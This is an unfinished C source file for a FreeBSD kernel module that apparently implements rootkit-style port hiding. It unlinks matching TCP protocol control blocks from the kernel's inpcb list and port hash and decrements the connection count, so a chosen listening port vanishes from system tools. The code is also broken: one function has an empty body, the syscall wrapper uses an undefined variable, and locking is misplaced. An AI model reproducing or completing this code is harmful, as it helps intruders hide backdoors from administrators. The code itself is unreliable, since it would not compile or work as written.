#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <sys/sysproto.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>

//todo ipi_hashbase  in_pcb.h
//todo ipi_porthashbase in_pcb.h
//struct inpcb {
//   *LIST ENTRIES* remove each of these from respective lists
//    inp_hash
//    inp_pcbgrouphash
//    inp_pcbgroup_wild
//    inp_portlist
//    inp_list -- done
//
//}
//
//struct inpcbport {
//    *LIST ENTRIES*
//     phd_hash
//}    
//
//struct inpcblbgroup {
//    il_list
//
//}
//
//struct inpcbinfo {
//inpcbhead *ipi_listhead ** remove
//inpcbgroup *ipi_pcbgroups 
//inpcbhead *ipi_hashbase ** remove
//inpcbporthead *ipi_porthashbase **remove
//inpcbhead *ipi_wildbase
//inpcblbgrouphead *ipi_lbgrouphashbase
//
//}
//
//struct inpcbgroup {
//    struct inpcbhead *ipg_hashbase
//
//}

struct port_hiding_args {
    u_int16_t lport; /* local port */
};

static int hide_port(u_int16_t lport){
  
}
//1
static int iterate_ipi_listhead(u_int16_t lport) {
    struct inpcb *inpb;
    CK_LIST_FOREACH(inpb, V_tcbinfo.ipi_listhead, inp_list) {
    
        if (inpb->inp_vflag & INP_TIMEWAIT)
            continue;
        INP_WLOCK(inpb);
/* Do we want to hide this local open port? */
        if (lport == ntohs(inpb->inp_inc.inc_ie.ie_lport)){
            CK_LIST_REMOVE(inpb, inp_list);
            V_tcbinfo.ipi_count--; //reduce ipi_count  
	} 
	INP_WUNLOCK(inpb);
    }
      return 0;	
}

//2
//NOTES what goes with what 
//ignore for now, now sure what to do with it
//inpcb -> inp_portlist
//requires inpcb lock and ipi_hash_lock
static int iterate_port_hash(u_int16_t lport) {
     //struct inpcb *inpb;
     struct inpcbport *inpb;
     //cur, head, list
     CK_LIST_FOREACH(inpb, V_tcbinfo.ipi_porthashbase, phd_hash) {
    
        INP_HASH_WLOCK(&V_tcbinfo);
// Do we want to hide this local open port? 
        if (lport == ntohs(inpb->phd_port)){
            CK_LIST_REMOVE(inpb, phd_hash);   
	}
	INP_HASH_WUNLOCK(&V_tcbinfo);
     }	
      return 0;
}

//This will cause issues with the ability for the port to send data
/*
static int iterate_hash(u_int16_t lport){
    return 0;
}	
*/

/* System call to hide an open port. */
static int port_hiding(u_int16_t lport) {

    INP_INFO_WLOCK(&V_tcbinfo);
    /* Iterate through the TCP-based inpcb list. */
    iterate_ipi_listhead(uap->lport); 
    iterate_port_hash(uap->lport); 
    INP_INFO_WUNLOCK(&V_tcbinfo);
    return(0);
}

